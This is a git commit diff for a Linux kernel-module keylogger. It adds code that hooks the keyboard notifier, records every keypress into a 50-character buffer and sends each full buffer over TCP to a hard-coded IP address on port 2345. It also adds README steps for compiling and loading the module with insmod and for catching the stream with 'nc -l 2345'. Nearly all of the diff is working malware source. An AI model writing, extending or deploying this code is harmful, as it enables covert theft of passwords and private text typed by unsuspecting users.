a8b5b82b7284b0b2b45400b02792b2517f4c21d8
shangsuru <helm.henry99@gmail.com>
2022-02-21 10:32:42 -0500

    capture keystrokes and send them via TCP

--- README.md
+++ README.md
@@ -1,11 +1,30 @@
 # Keylogger
 
-## Installation
+## Kernel Module
 
-```
+Follow these steps to install the kernel module onto the linux machine. It will capture keystrokes  
+and send them to a hard coded server address at port 2345.  
+
+For testing, you can start a TCP listener at that server with `nc -l 2345`.
+
+
+1. Compile the kernel module
+    ```
 	make
-	sudo insmod keylogger.ko # load the module into kernel
-	sudo dmesg # show kernel logs
+    ```
+
+2. Load the kernel module
+    ```
+	sudo insmod keylogger.ko
 	sudo lsmod # show kernel modules
-	sudo rmmod keylogger # unload the module from kernel
-```
+    ```
+
+3. View kernel logs
+    ```
+	sudo dmesg
+    ```
+
+4. Unload the kernel module
+    ```
+	sudo rmmod keylogger
+    ```
--- keylogger.c
+++ keylogger.c
@@ -2,21 +2,118 @@
 #include <linux/kernel.h>
 #include <linux/notifier.h>
 #include <linux/keyboard.h>
+#include <linux/init.h>
+
+#include <linux/net.h>
+#include <net/sock.h>
+#include <linux/tcp.h>
+#include <linux/in.h>
+#include <asm/uaccess.h>
+#include <linux/socket.h>
+#include <linux/slab.h>
 
 
-static const char* keymap[] = {
-	"\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
-	"-", "=", "_BACKSPACE_", "_TAB_", "q", "w", "e", "r", "t", "y",
-	"u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d",
-	"f", "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z",
-	"x", "c", "v", "b", "n", "m", ",", "."
+#define SERVER_PORT 2345 // port of the server, where the captured keystrokes are sent to
+#define KEYBOARD_BUFFER_SIZE 50 // how many chars are buffered until they are sent to the server
+
+struct socket *conn_socket = NULL; // socket to the server receiving keystrokes
+unsigned char server_ip[5] = {192, 168, 1, 104, '\0'}; // IP of the server receiving keystrokes
+char keyboard_buffer[KEYBOARD_BUFFER_SIZE]; // buffer for captured keystrokes
+size_t keyboard_buffer_index = 0;
+
+// Mapping keycodes to chars. Not complete. Some special characters mapped to underscore
+static const char keymap[] = {
+	'_', '_', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
+	'-', '=', '_', '_', 'q', 'w', 'e', 'r', 't', 'y',
+	'u', 'i', 'o', 'p', '[', ']', '_', '_', 'a', 's', 'd',
+	'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', '_', '\\', 'z',
+	'x', 'c', 'v', 'b', 'n', 'm', ',', '.'
 };
 
+static u32 create_address(u8 *ip) {
+	u32 addr = 0;
+	int i;
+	for (i = 0; i < 4; i++) {
+		addr += ip[i];
+		if (i == 3) {
+			break;
+		}
+		addr <<= 8;
+	}
+	return addr;
+}
+
+static void tcp_send_to_server(struct socket *sock, const char *buf, const size_t length, unsigned long flags) {
+	struct msghdr msg;
+	struct kvec vec;
+	int len;
+	int written = 0; 
+	int left = length;
+
+	msg.msg_name = 0;
+	msg.msg_namelen = 0;
+	msg.msg_control = NULL;
+	msg.msg_controllen = 0;
+	msg.msg_flags = flags;
+
+repeat_send:
+	vec.iov_len = left;
+	vec.iov_base = (char *)buf + written;
+	len = kernel_sendmsg(sock, &msg, &vec, left, left);
+	if ((len == -ERESTARTSYS) || (!(flags & MSG_DONTWAIT) && (len == -EAGAIN))) {
+		goto repeat_send;
+	}
+	if (len > 0) {
+		written += len;
+		left -= len;
+		if (left) {
+			goto repeat_send;
+		}
+	}
+}
+
+static int tcp_connection_init(void) {
+	struct sockaddr_in saddr;
+	int ret = -1;
+
+	ret = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_socket);
+	if (ret < 0) {
+		pr_info("Error: %d while creating socket", ret);
+		return -1;
+	}
+
+	memset(&saddr, 0, sizeof(saddr));
+	saddr.sin_family = AF_INET;
+	saddr.sin_port = htons(SERVER_PORT);
+	saddr.sin_addr.s_addr = htonl(create_address(server_ip));
+
+	ret = conn_socket->ops->connect(conn_socket, (struct sockaddr *) &saddr, sizeof(saddr), O_RDWR);
+	if (ret && (ret != -EINPROGRESS)) {
+		pr_info("Error: %d while connecting using conn_socket", ret);
+		return -1;
+	}
+
+	return 0;
+}
+
+// Called on every keystroke
 int notify_keypress(struct notifier_block *nb, unsigned long code, void *_param) {
-	struct keyboard_notifier_param *param;
-	param = _param;
+	struct keyboard_notifier_param *param = _param;
 	if (code == KBD_KEYCODE && param->down) {
-		printk(KERN_NOTICE "A key was pressed...\n");
+		unsigned int keycode = param->value;
+		size_t keymap_size = sizeof(keymap) / sizeof(keymap[0]);
+		if (keycode < keymap_size) { // mapping for that keycode exists
+			if (keyboard_buffer_index < KEYBOARD_BUFFER_SIZE) {
+				keyboard_buffer[keyboard_buffer_index++] = keymap[keycode];
+				if (keyboard_buffer_index == KEYBOARD_BUFFER_SIZE) { // buffer is full
+					tcp_send_to_server(conn_socket, keyboard_buffer, KEYBOARD_BUFFER_SIZE, MSG_DONTWAIT);
+					
+					// clear buffer
+					memset(keyboard_buffer, 0, KEYBOARD_BUFFER_SIZE);
+					keyboard_buffer_index = 0;
+				}
+			}
+		}
 	}
 	return NOTIFY_OK;
 }
@@ -25,15 +122,19 @@ static struct notifier_block nb = {
 	.notifier_call = notify_keypress
 };
 
+// Called when loading the kernel module
 static int __init startup(void) {
 	register_keyboard_notifier(&nb);
-	printk(KERN_INFO "Loaded keylogger!\n");
+	tcp_connection_init();
+	pr_info("Loaded keylogger!\n");
 	return 0;
 }
 
+// Called when unloading the kernel module
 static void __exit shutdown(void) {
 	unregister_keyboard_notifier(&nb);
-	printk(KERN_INFO "Keylogger unloaded!\n");
+	sock_release(conn_socket);
+	pr_info("Keylogger unloaded!\n");
 }
 
 module_init(startup);
